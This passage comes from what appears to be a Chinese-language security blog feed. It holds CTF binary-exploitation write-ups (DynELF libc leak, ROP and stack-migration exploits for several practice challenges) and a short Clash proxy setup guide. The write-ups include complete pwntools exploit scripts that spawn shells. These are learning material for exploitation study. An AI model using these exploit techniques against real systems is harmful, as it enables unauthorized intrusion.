title="idaåˆ†æ"></a>idaåˆ†æ</h5><pre><code>int sub_40068E(){  char v1; // [rsp+0h] [rbp-40h]  sub_40063D((__int64)&amp;v1, 200);  return puts(&quot;bye~&quot;);}__int64 __fastcall sub_40063D(__int64 a1, signed int a2){  __int64 result; // rax  signed int i; // [rsp+1Ch] [rbp-4h]  for ( i = 0; ; ++i )  {    result = (unsigned int)i;    if ( i &gt;= a2 )      break;    read(0, (void *)(i + a1), 1uLL);  }  return result;}</code></pre><p>ä¸»è¦çš„æ¼æ´å‡½æ•°åœ¨è¿™ä¸¤ä¸ªã€‚è¿™äºŒä¸ªå‡½æ•°ç»“åˆèµ·æ¥å¼•èµ·æ ˆæº¢å‡ºï¼Œç¬¬äºŒä¸ªå‡½æ•°è¿˜å¯¹è¯»å…¥æ•°æ®åšäº†å¤„ç†ï¼Œæˆ‘ä»¬è¦ä¿è¯é€è¿‡å»200çš„ä¸ªè‡ªå·±ï¼Œæ³¨æ„è¦ç”¨sendå‘ã€‚</p><ol><li>å› ä¸ºå…¶æœ‰putså‡½æ•°ï¼Œè¿™æ¬¡å°±ç”¨putså‡½æ•°æ¥è¿›è¡Œleakã€‚ç­‰leakå‡ºæ¥ä»¥åï¼Œè¿”å›startæ¸…ç†æ ˆï¼Œå†ç”¨dynelfæ‰¾å‡ºsystemï¼Œå’Œreadå‡½æ•°çš„åœ°å€ã€‚</li><li>ç¬¬äºŒæ¬¡æ„é€ ropé“¾çš„æ—¶å€™ï¼Œç”¨readå‡½æ•°è¯»<code>system(/bin/sh)</code>åˆ°ä¸€ä¸ªç¡®å®šçš„åœ°å€ï¼Œè¿˜æ˜¯ä¼šåˆ°startå¤„ã€‚</li><li>ç¬¬ä¸‰æ¬¡æ„é€ æ—¶å€™ï¼Œç›´æ¥è¿›è¡Œè°ƒç”¨systemå‡½æ•°çš„ropé“¾å³å¯ã€‚</li></ol><p>å…¶ä¸­å¯¹äºreadè¿™ä¸ªå‡½æ•°ï¼Œrdxè¿™ä¸ªå‚æ•°å°±å¾—ç”¨ä¸‡èƒ½gadgetæ¥æ§åˆ¶äº†ã€‚<br><img src="/2020/02/15/åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯/images/15817725422726.jpg" srcset="/img/loading.gif" alt="-w820"></p><h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><pre><code>#coding:utf-8from pwn import *context.arch = &#39;amd64&#39;# context.log_level = &#39;info&#39;io = process(&#39;./pwn100&#39;)elf = ELF(&#39;./pwn100&#39;)# libc = elf.libcpadding = 72puts_plt = elf.plt[&#39;puts&#39;]read_got = elf.got[&#39;read&#39;]start_add = 0x000400550pop_rdi = 0x400763def leak(addr):    payload = padding * &#39;a&#39; + p64(pop_rdi) + p64(addr) + p64(puts_plt) + p64(start_add)#flat[(pop_rdi,addr,puts_plt,start_add)]    payload = payload.ljust(200,&#39;b&#39;)    io.send(payload)    count = 0    up = &#39;&#39;    content = &#39;&#39;    io.recvuntil(&#39;bye~\n&#39;) #ä¸€å®šè¦åœ¨putså‰é‡Šæ”¾å®Œè¾“å‡º    while True:        c = io.recv(numb=1, timeout=0.1)        count += 1        if up == &#39;\n&#39; and c == &quot;&quot;:  #æ¥æ”¶åˆ°çš„ä¸Šä¸€ä¸ªå­—ç¬¦ä¸ºå›è½¦ç¬¦ï¼Œè€Œå½“å‰æ¥æ”¶ä¸åˆ°æ–°å­—ç¬¦ï¼Œåˆ™            content = content[:-1]  +&#39;\x00&#39;             #åˆ é™¤putså‡½æ•°è¾“å‡ºçš„æœ«å°¾å›è½¦ç¬¦            break            content += c        else:            up = c    content = content[:4]  #å–æŒ‡å®šå­—èŠ‚æ•°    log.info(&quot;%#x =&gt; %s&quot; % (addr, (content or &#39;&#39;).encode(&#39;hex&#39;)))    return contentd = DynELF(leak, elf = elf)system_addr = d.lookup(&#39;system&#39;,&#39;libc&#39;)log.info(&#39;system_addr = %#x&#39; %system_addr)binsh_addr = 0x601068 - 8payload = padding * &#39;a&#39; + flat([0x0040075A,0,1,read_got,8,binsh_addr,0,0x00400740,&#39;\x00&#39;*56,start_add])payload = payload.ljust(200,&#39;b&#39;)io.send(payload)io.recvuntil(&#39;bye~\n&#39;)io.send(&#39;/bin/sh\x00&#39;)payload = padding * &#39;a&#39; + flat([pop_rdi,binsh_addr,system_addr])payload = payload.ljust(200,&#39;b&#39;)io.send(payload)io.interactive()</code></pre><h3 id="å…¶ä»–è·å–libcçš„æ–¹æ³•"><a href="#å…¶ä»–è·å–libcçš„æ–¹æ³•" class="headerlink" title="å…¶ä»–è·å–libcçš„æ–¹æ³•"></a>å…¶ä»–è·å–libcçš„æ–¹æ³•</h3><p>è™½ç„¶DynELFæ˜¯ä¸€ä¸ªdumpåˆ©å™¨ï¼Œä½†æ˜¯å¦‚æœå†™ä¸å‡ºæ¥leakå‡½æ•°ï¼Œä¸‹libcè¢«å¢™ç­‰ç­‰ã€‚å°±ç”¨è¿™ä¸¤ä¸ªç½‘ç«™ï¼š<br><a href="http://libcdb.com/" target="_blank" rel="noopener">http://libcdb.com/</a><br><a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a><br>éƒ½æ˜¯åªæœ‰æœ‰ä¸¤ä¸ªæ³„éœ²åœ°å€ï¼Œå°±å¯ä»¥æŸ¥åˆ°å¯¹åº”çš„libcç‰ˆæœ¬ï¼Œå¹¶ä¸”å¯ä»¥ç»™å‡ºå…¶åŸä»¶ï¼Œæ¥ç€å°±å¯ä»¥è¿›è¡Œå…¶ä»–æ“ä½œã€‚</p><p>è¿˜æœ‰åœ¨æ¯”èµ›è¿‡ç¨‹ä¸­ï¼Œå¦‚æœä¸€ä¸ªé¢˜ç›®ä¸å¥½è·å–åˆ°libcï¼Œé‚£ä¹ˆå¯ä»¥çœ‹çœ‹å…¶ä»–é¢˜ç›®çš„libcï¼Œæœ‰å¯èƒ½è¿™ä¸ªèµ›äº‹å¹³å°æœåŠ¡å™¨éƒ½æ˜¯è¿™ä¸ªç‰ˆæœ¬ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>å­¦ä¹ è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linuxä¸‹clashçš„ä½¿ç”¨</title>
    <link href="/2020/02/14/linux%E4%B8%8Bclash%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2020/02/14/linux%E4%B8%8Bclash%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="linuxä¸‹clashçš„ä½¿ç”¨"><a href="#linuxä¸‹clashçš„ä½¿ç”¨" class="headerlink" title="linuxä¸‹clashçš„ä½¿ç”¨"></a>linuxä¸‹clashçš„ä½¿ç”¨</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ–‡åªæ˜¯å¾ˆç®€å•è®°å½•ä¸€ä¸‹ï¼Œè‡ªå·±å¦‚ä½•ä½¿ç”¨clashçš„ã€‚å› ä¸ºå‘ç°ç»ˆç«¯è™½è¯´åœ¨æœ¬æœºä¸Šå·²ç»å¼€äº†ä»£ç†ï¼Œä½†æ˜¯ç»ˆç«¯æ‰§è¡Œå‘½ä»¤ä¸‹è½½ä¸œè¥¿çš„æ—¶å€™ååˆ†çš„å¡ï¼Œä»Šå¤©æ‰äº†è§£åˆ°ï¼ŒåŸæ¥ç»ˆç«¯çš„ä»£ç†æ˜¯å¦å¤–å¼€çš„ã€‚æ‰€ä»¥å°±å¼€å§‹æŠ˜è…¾ä¸€ä¸‹ï¼Œlinuxä¸‹clashçš„ä½¿ç”¨ï¼ˆæœ¬äººç”¨äº†å¾ˆä¹…äº†clashï¼Œæ‰€ä»¥ç›´æ¥çœ‹è¿™ä¸ªè½¯ä»¶äº†ï¼‰ã€‚</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>æ‰§è¡Œ<code>cd &amp;&amp; mkdir clash</code> åœ¨ç”¨æˆ·ç›®å½•ä¸‹åˆ›å»º clash æ–‡ä»¶å¤¹ã€‚<br>ä¸‹è½½é€‚åˆçš„ Clash äºŒè¿›åˆ¶æ–‡ä»¶å¹¶è§£å‹é‡å‘½åä¸º clash,ä¸€èˆ¬ä¸ªäººçš„64ä½ç”µè„‘ä¸‹è½½ clash-linux-amd64.tar.gz å³å¯ã€‚<br>åœ°å€ï¼š<a href="https://github.com/Dreamacro/clash/releases" target="_blank" rel="noopener">https://github.com/Dreamacro/clash/releases</a></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>åœ¨ç»ˆç«¯cdåˆ°ClashäºŒè¿›åˆ¶æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•,æŠŠClash é…ç½®æ–‡ä»¶ç»™ç§»è¿›å»ã€‚é…ç½®æ–‡ä»¶çš„åç§°è¦æ˜¯config.yaml<br><img src="/2020/02/14/linuxä¸‹clashçš„ä½¿ç”¨/images/15816946080116.jpg" srcset="/img/loading.gif" alt="-w286"></p><p>æˆ‘æ˜¯ç›´æ¥åˆ›å»ºäº†è¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶å†™å…¥çš„è‡ªå·±çš„é…ç½®ï¼Œå› ä¸ºmacæœ¬æœºä¸€ç›´ç”¨è¿™ä¸ªè½¯ä»¶ï¼Œç„¶ååœ¨é…ç½®æ–‡ä»¶æ‰¾åˆ°ä¸»ä½¿ç”¨é‚£ä¸ªï¼Œç›´æ¥å¤åˆ¶é‚£ä¸ªè‡ªå·±ä½¿ç”¨ä»£ç†ç½‘ç«™åŠ è½½ä¸‹æ¥çš„é…ç½®ç»™config.yamlã€‚</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p><code>chmod +x ./clash</code>åŠ æ‰§è¡Œæƒé™<br>æ‰§è¡Œ ./clash -d . å³å¯å¯åŠ¨ Clashï¼ŒåŒæ—¶å¯åŠ¨ HTTP ä»£ç†å’Œ Socks5 ä»£ç†ã€‚<br>ç„¶åè¿›å…¥è¿™ä¸ª<a href="http://clash.razord.top/" target="_blank" rel="noopener">http://clash.razord.top/</a> é“¾æ¥å¯ä»¥å¯¹ä»£ç†è¿›è¡Œä¸ªç®€å•ç®¡ç†<br><img src="/2020/02/14/linuxä¸‹clashçš„ä½¿ç”¨/images/15816952499188.jpg" srcset="/img/loading.gif" alt="-w794"></p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>æ‰“å¼€ç³»ç»Ÿè®¾ç½®ï¼Œé€‰æ‹©ç½‘ç»œï¼Œç‚¹å‡»ç½‘ç»œä»£ç†å³è¾¹çš„ âš™ æŒ‰é’®ï¼Œé€‰æ‹©æ‰‹åŠ¨ï¼Œå¡«å†™ HTTP å’Œ HTTPS ä»£ç†ä¸º 127.0.0.1:7890ï¼Œå¡«å†™ Socks ä¸»æœºä¸º 127.0.0.1:7891ï¼Œå³å¯å¯ç”¨ç³»ç»Ÿä»£ç†ã€‚<br><img src="file:///Volumes/data/chumenblog/source/images/15816953014396.jpg" srcset="/img/loading.gif" alt="-w409"></p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>ç»ˆç«¯å¼€å¯ä»£ç†<br><code>export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7891</code><br>æ‰§è¡Œè¿™ä¸ªå‘½ä»¤å³å¯ã€‚<br><img src="file:///Volumes/data/chumenblog/source/images/15816954013538.jpg" srcset="/img/loading.gif" alt="-w495"><br>å‡ºç°è¿™ä¸ªå°±æ˜¯ä»£ç†æˆåŠŸäº†ï¼Œç„¶åå°±ä¼šå‘ç°ç»ˆç«¯ä¸‹è½½ä¸œè¥¿çš„ç¥é€Ÿã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Stack Migrationé¢˜ç›®ç»ƒä¹ </title>
    <link href="/2020/02/11/Stack%20Migration%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/"/>
    <url>/2020/02/11/Stack%20Migration%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="Stack-Migrationé¢˜ç›®ç»ƒä¹ "><a href="#Stack-Migrationé¢˜ç›®ç»ƒä¹ " class="headerlink" title="Stack Migrationé¢˜ç›®ç»ƒä¹ "></a>Stack Migrationé¢˜ç›®ç»ƒä¹ </h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è®°å½•å‡ é“Stack Migrationçš„ç»ƒä¹ é¢˜ã€‚</p><h2 id="pwnable-simple-login"><a href="#pwnable-simple-login" class="headerlink" title="pwnable_simple_login"></a>pwnable_simple_login</h2><h3 id="æŸ¥çœ‹ä¿æŠ¤å’Œarch"><a href="#æŸ¥çœ‹ä¿æŠ¤å’Œarch" class="headerlink" title="æŸ¥çœ‹ä¿æŠ¤å’Œarch"></a>æŸ¥çœ‹ä¿æŠ¤å’Œarch</h3><pre><code class="c">    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>32ä½ç¨‹åºï¼Œå¼€äº†nxå’ŒCanaryä¿æŠ¤ã€‚</p><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  int de_s; // [esp+18h] [ebp-28h]  char s; // [esp+1Eh] [ebp-22h]  unsigned int de_length; // [esp+3Ch] [ebp-4h]  memset(&amp;s, 0, 0x1Eu);  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  printf(&quot;Authenticate : &quot;);  _isoc99_scanf(&quot;%30s&quot;, &amp;s);  memset(&amp;input, 0, 0xCu);  de_s = 0;  de_length = Base64Decode((int)&amp;s, &amp;de_s);     // v6 = è§£ç åçš„é•¿åº¦  if ( de_length &gt; 0xC )  {    puts(&quot;Wrong Length&quot;);  }  else  {    memcpy(&amp;input, de_s, de_length);  // æ‰§è¡Œå®Œï¼ŒæŠŠè§£ç åçš„å­—æ®µï¼Œæ”¾å…¥inputçš„bsså†…å­˜ä¸Š    if ( auth(de_length) == 1 )      correct();  }  return 0;}</code></pre><p>ï¼ˆå…¶ä¸­å·²ç»æ”¹äº†éƒ¨åˆ†å˜é‡çš„åç§°æ–¹ä¾¿è¯»ä»£ç ï¼‰<br>æµç¨‹å°±æ˜¯æ¥å—ä¸€æ®µbase64ç¼–ç è¿‡çš„å­—ç¬¦ä¸²ï¼Œç„¶åè¿›è¡Œä¸€ä¸‹è§£ç ï¼Œè§£ç è¿”å›é•¿åº¦ç»™å˜é‡ï¼Œä¸”åšä¸12å¤§å°çš„æ¯”è¾ƒï¼Œå¦‚æœè§£ç åå¤§äº12ï¼Œå°±ç›´æ¥é€€å‡ºç¨‹åºï¼Œå¹¶ä¸”è§£ç çš„å­—ç¬¦ä¸²æ˜¯æ”¾åœ¨inputçš„è¿™ä¸ªå…¨å±€å˜é‡é‡Œï¼š<br><img src="/2020/02/11/Stack Migrationé¢˜ç›®ç»ƒä¹ /images/15814303737109.jpg" srcset="/img/loading.gif" alt="-w601"><br>æ¥ç€è¿›å…¥authå‡½æ•°åˆ†æä¸€ä¸‹ï¼š</p><pre><code class="c">_BOOL4 __cdecl auth(int length){  char v2; // [esp+14h] [ebp-14h]  char *s2; // [esp+1Ch] [ebp-Ch]  int v4; // [esp+20h] [ebp-8h]  memcpy(&amp;v4, &amp;input, length);  s2 = (char *)calc_md5((int)&amp;v2, 12);  printf(&quot;hash : %s\n&quot;, s2);  return strcmp(&quot;f87cd601aa7fedca99018a8be88eda34&quot;, s2) == 0;}</code></pre><p>å¯ä»¥å‘ç°å…¶æ˜¯ä¸€ä¸ªmd5åŠ å¯†åï¼Œç„¶åè·Ÿåé¢é‚£ä¸²å­—ç¬¦ä¸²å¯¹æ¯”ã€‚å¹¶ä¸”çœ‹ä¸€ä¸‹v4å˜é‡ï¼š<br><img src="/2020/02/11/Stack Migrationé¢˜ç›®ç»ƒä¹ /images/15814310284289.jpg" srcset="/img/loading.gif" alt="-w407"><br>å‘ç°memcpyè¿™ä¸ªå‡½æ•°ä¼šå¼•èµ·æ ˆæº¢å‡ºï¼Œä½†æ˜¯å¯æ§çš„åªæ˜¯12-8 = 4å­—èŠ‚ã€‚<img src="/2020/02/11/Stack Migrationé¢˜ç›®ç»ƒä¹ /images/15814313605840.jpg" srcset="/img/loading.gif" alt="-w1241"><br>ç„¶åè¾“å…¥12ä½â€˜1â€™ï¼Œç¼–ç åæ”¾å…¥ç¨‹åºï¼Œå‘ç°æœ€åçš„4ä¸ªå­—èŠ‚è¢«æ”¾å…¥äº†ebpï¼Œæ­£å¥½è¿™ä¸‹å°±å¯ä»¥æ§åˆ¶ebpäº†ã€‚æ¥ç€å°±æœ‰äº†æ”»å‡»æ€è·¯ï¼š</p><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><p>æ§åˆ¶å¥½è¿™ä¸ªebpï¼Œç„¶åç”±äºè¿™ä¸ªç¨‹åºä¸­ï¼Œauthå‡½æ•°æœ€åæœ‰ä¸€ä¸ªleave ret çš„gadgetï¼Œmainå‡½æ•°ä¹Ÿæœ‰ä¸€ä¸ªï¼Œæ­£å¥½æ»¡è¶³æˆ‘ä»¬æ¥Stack Migrationã€‚åœ¨æ ˆä¸Šæ‘†æ”¾çš„ç»“æ„ä¸ºï¼š<br><img src="/2020/02/11/Stack Migrationé¢˜ç›®ç»ƒä¹ /images/15814316930734.jpg" srcset="/img/loading.gif" alt="-w353"><br>åˆ°æ—¶å€™ç”±äºmemcpyä¼šå¤åˆ¶è¿™ä¸ªè€æ ˆçš„å‰12ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œç„¶ånew espæŒ‡å‘çš„æ˜¯å›ºå®šä½ç½®inputã€‚ç„¶åä¸¤ä¸ªleave gadgetå³å¯</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code>from pwn import *from base64 import *# io = process(&#39;./login&#39;)io = remote(&#39;node3.buuoj.cn&#39;,29026)system_add = 0x08049284buf = 0x0811EB40io.recvuntil(&#39;e : &#39;)p = &#39;aaaa&#39; + p32(system_add) + p32(buf)io.sendline(b64encode(p))io.interactive()</code></pre><h2 id="å®‰æ’æœˆèµ›-over-over"><a href="#å®‰æ’æœˆèµ›-over-over" class="headerlink" title="å®‰æ’æœˆèµ›_over.over"></a>å®‰æ’æœˆèµ›_over.over</h2><h3 id="æŸ¥ä¿æŠ¤å’Œarch"><a href="#æŸ¥ä¿æŠ¤å’Œarch" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><pre><code>[*] &#39;/media/psf/mypwn2/ichunqiu/stack_pivot/ah_over/over.over&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>64ä½ï¼Œåªå¼€äº†nx</p><h3 id="idaåˆ†æ-1"><a href="#idaåˆ†æ-1" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3){  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  while ( sub_400676() )    ;  return 0LL;}</code></pre><p>ä¸»å‡½æ•°ååˆ†ç®€å•ï¼Œä¸»è¦æ ¸å¿ƒå°±åœ¨whileåŒ…è£¹çš„å‡½æ•°:</p><pre><code>int sub_400676(){  char buf; // [rsp+0h] [rbp-50h]  memset(&amp;buf, 0, 0x50uLL);  putchar(&#39;&gt;&#39;);  read(0, &amp;buf, 0x60uLL);  return puts(&amp;buf);}</code></pre><p>å¯ä»¥çœ‹åˆ°æº¢å‡ºå¯æ§è‡ªå·±åªæœ‰8ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªgadgetï¼Œæ˜æ˜¾éœ€è¦Stack Migrationï¼Œ<br>é‚£ä¹ˆå°±å¾—æ§åˆ¶å¥½ebpï¼Œpaddingå³ä¸º0x50ï¼Œä½†æ˜¯è¿™ä¸ªé¢˜ç›®æ²¡æœ‰ç»™æˆ‘ä»¬å›ºå®šçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰å…¨å±€å˜é‡å¯ç”¨ï¼Œé‚£å°±æƒ³åŠæ³•çœ‹æ ˆåç§»äº†ã€‚</p><p>å¯ä»¥çœ‹åˆ°æ˜¯readå‡½æ•°ï¼Œå’Œputså‡½æ•°çš„æ­é…ï¼Œå½“å¾€é‡Œé¢å¡0x50å­—èŠ‚å­—ç¬¦æ˜¯ä¸ä¼šæ·»åŠ ä¸Šâ€™\x00â€™çš„:<br><img src="/2020/02/11/Stack Migrationé¢˜ç›®ç»ƒä¹ /images/15814741030442.jpg" srcset="/img/loading.gif" alt="-w781"><br><img src="/2020/02/11/Stack Migrationé¢˜ç›®ç»ƒä¹ /images/15814741289950.jpg" srcset="/img/loading.gif" alt="-w649"></p><p>ç„¶åç”¨putså‡½æ•°è¾“å‡ºæ—¶ä¼šæŠŠebpé‡Œé¢çš„å€¼ä¹Ÿä¼šè¾“å‡ºå‡ºæ¥ã€‚è¿™ä¸‹æ ˆåç§»æ˜¯å›ºå®šçš„ï¼Œå°±å¯ä»¥åœ¨readçš„æ—¶å€™å¾€é‡Œé¢å¡ropé“¾ï¼Œä¾é åç§»æ¥è·³ä¸Šå»æ‰§è¡Œå°±å¯ä»¥äº†ã€‚<br><img src="/2020/02/11/Stack Migrationé¢˜ç›®ç»ƒä¹ /images/15814770925207.jpg" srcset="/img/loading.gif" alt="-w842"><br>ç®—ä¸€ä¸‹mainçš„ebpä¸ç°åœ¨çš„espå·®è·æ˜¯112ä¸ªå­—èŠ‚ã€‚è®©ebp-112å°±ç­‰äºespæŒ‡å‘äº†æ ˆé¡¶espã€‚</p><h3 id="æ”»å‡»æ€è·¯-1"><a href="#æ”»å‡»æ€è·¯-1" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><p>å…ˆç»™ç¨‹åº0x50ä¸ªå­—èŠ‚ï¼Œç„¶åæ¥æ”¶ä¸‹mainçš„ebpå€¼ã€‚ç„¶åç¨‹åºç”±äºwhileå¾ªç¯å†æ¬¡ï¼Œè¿›å…¥è¿™ä¸ªå‡½æ•°ï¼Œè¿™æ—¶å€™é€ropé“¾ï¼Œç¬¬ä¸€ä¸ªropé“¾å¯ä»¥å…ˆæ³„éœ²ä¸‹putsçš„å†…å­˜åœ°å€ï¼Œç„¶åè®¡ç®—libcçš„åœ°å€ï¼Œè¿”å›åœ°å€å†™æˆä¸»å‡½æ•°startï¼Œæ¸…ç†ä¸‹æ ˆã€‚ç„¶åç¬¬äºŒæ¬¡è¯»çš„æ—¶å€™ï¼Œé€è¿‡å»system(/bin/sh)çš„ropé“¾å³å¯ã€‚ç¨‹åºæ¯æ¬¡è¯»ï¼Œæ„é€ å¥½ropé“¾çš„æ—¶å€™ï¼Œè¦ä¿è¯é€è¿‡å»80å­—èŠ‚ï¼Œç„¶åæ§åˆ¶ebp ä¸ºæ ˆé¡¶espï¼Œè¿˜æœ‰åŠ ä¸Šleave çš„gadgetï¼Œè¿™ä¸‹ä¸¤ä¸ªleaveçš„gadgetå°±è®©ç¨‹åºè·³å›æ ˆå¤´çš„ä¸‹ä¸ª8ä¸ªå­—èŠ‚ï¼Œå¼€å§‹æ‰§è¡Œropé“¾ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./over.over&#39;)e = ELF(&#39;./over.over&#39;)l = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;)leave_ret = 0x004006be pop_rdi_ret = 0x0400793put_got = e.got[&#39;puts&#39;]put_plt = e.symbols[&#39;puts&#39;]padding = 80raw_input(&#39;-&gt;&#39;)io.sendafter(&quot;&gt;&quot;, &#39;a&#39; * 80)# stack = u64(io.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8, &#39;\0&#39;)) - 0x70stack = u64((io.recvline())[80:86].ljust(8,&#39;\x00&#39;)) - 0x70io.readuntil(&#39;&gt;&#39;)print(hex(stack))p = flat([&#39;11111111&#39;,pop_rdi_ret,put_got,put_plt,0x000400580,(80-40)*&#39;1&#39;,stack,leave_ret])raw_input(&#39;-&gt;&#39;)io.send(p)libc = u64(io.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8, &#39;\0&#39;)) - l.symbols[&#39;puts&#39;]print(hex(libc))io.sendafter(&quot;&gt;&quot;, &#39;a&#39; * 80)stack = u64((io.recvline())[80:86].ljust(8,&#39;\x00&#39;)) - 0x70print(hex(stack))io.readuntil(&#39;&gt;&#39;)system_add = libc + l.symbols[&#39;system&#39;]binsh_add = libc + l.search(&#39;/bin/sh\x00&#39;).next()p = flat([&#39;22222222&#39;,pop_rdi_ret,binsh_add,system_add,(80-4*8)*&#39;2&#39;,stack,leave_ret])io.send(p)io.interactive()</code></pre><h2 id="HITCON-training-lab6"><a href="#HITCON-training-lab6" class="headerlink" title="HITCON_training_lab6"></a>HITCON_training_lab6</h2><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><pre><code class="c">#include &lt;stdio.h&gt;int count = 1337 ;char *t= &quot;Z\xc3&quot; ;int main(){if( count!=1337 ){    _exit(1);}count++ ;char buf[48];setvbuf(stdout,0,2,0);puts(&quot;Try your best : &quot; );read(0, buf,128);return ;}</code></pre><p><code>gcc -m32 -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration</code> ç¼–è¯‘å‘½ä»¤ã€‚<br>ç„¶åå°±ä¸åˆ†æäº†ï¼Œå‰é¢ç»ƒä¹ 64ä½æ—¶å€™å†™çš„é‚£ä¸ªåšå®¢å·²ç»è®°å½•å¾ˆæ¸…æ¥šäº†ï¼Œè¿™é‡Œåªè®°å½•ä¸‹expã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;# io = process(&#39;./migration&#39;)io = remote(&#39;127.0.0.1&#39;,4000)e = ELF(&#39;./migration&#39;)l = ELF(&#39;/lib/i386-linux-gnu/libc-2.23.so&#39;)padding = 40puts_plt = e.symbols[&#39;puts&#39;]puts_got = e.got[&#39;puts&#39;]read = e.symbols[&#39;read&#39;]leave_ret = 0x08048418buf1 = 0x0804b000 - 0x100buf2 = buf1 - 0x50pop_edx_ret = 0x0804836dp = &#39;a&#39; * padding + flat([buf1,read,leave_ret,0,buf1,0x50])io.readuntil(&#39;:\n&#39;)io.send(p)p = flat([buf2,puts_plt,pop_edx_ret,puts_got,read,leave_ret,0,buf2,0x50])sleep(0.1)raw_input(&#39;-&gt;&#39;)io.sendline(p)puts_add = u32(io.recv(4))libc = puts_add - l.symbols[&#39;puts&#39;]print(hex(libc))system_add = l.symbols[&#39;system&#39;] + libcbinsh_add = l.search(&#39;/bin/sh\x00&#39;).next() + libcp = flat([buf1,system_add,system_add,binsh_add])raw_input(&#39;-&gt;&#39;)# sleep(0.1)io.sendline(p)io.interactive()</code></pre><h2 id="spwn"><a href="#spwn" class="headerlink" title="spwn"></a>spwn</h2><h3 id="æŸ¥ä¿æŠ¤å’Œarch-1"><a href="#æŸ¥ä¿æŠ¤å’Œarch-1" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><pre><code>  Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="å°è¯•è¿è¡Œ"><a href="#å°è¯•è¿è¡Œ" class="headerlink" title="å°è¯•è¿è¡Œ"></a>å°è¯•è¿è¡Œ</h3><p><img src="/2020/02/11/Stack Migrationé¢˜ç›®ç»ƒä¹ /images/15817739064330.jpg" srcset="/img/loading.gif" alt="-w602"></p><h3 id="idaåˆ†æ-2"><a href="#idaåˆ†æ-2" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>ç›´æ¥çœ‹æ¼æ´å‡½æ•°</p><pre><code>ssize_t vul_function(){  size_t v0; // eax  size_t v1; // eax  char buf; // [esp+0h] [ebp-18h]  v0 = strlen(m1);  write(1, m1, v0);                             // Hello good Ctfer  read(0, &amp;s, 0x200u);  v1 = strlen(m2);  write(1, m2, v1);                             // What do you want to say?  return read(0, &amp;buf, 0x20u);}</code></pre><p>å‘ç°å¯ä»¥åˆ©ç”¨çš„gadgetåªæœ‰ä¸€ä¸ªï¼Œé‚£å°±åªæœ‰leaveçš„gadgetäº†ï¼Œç„¶åæŠŠebpæ§åˆ¶åˆ°å‰é¢çš„readå‡½æ•°çš„så¤„ï¼Œå…¶ä¹Ÿæ˜¯å…¨å±€å˜é‡ï¼Œåœ°å€å›ºå®šã€‚<br><img src="/2020/02/11/Stack Migrationé¢˜ç›®ç»ƒä¹ /images/15817774030678.jpg" 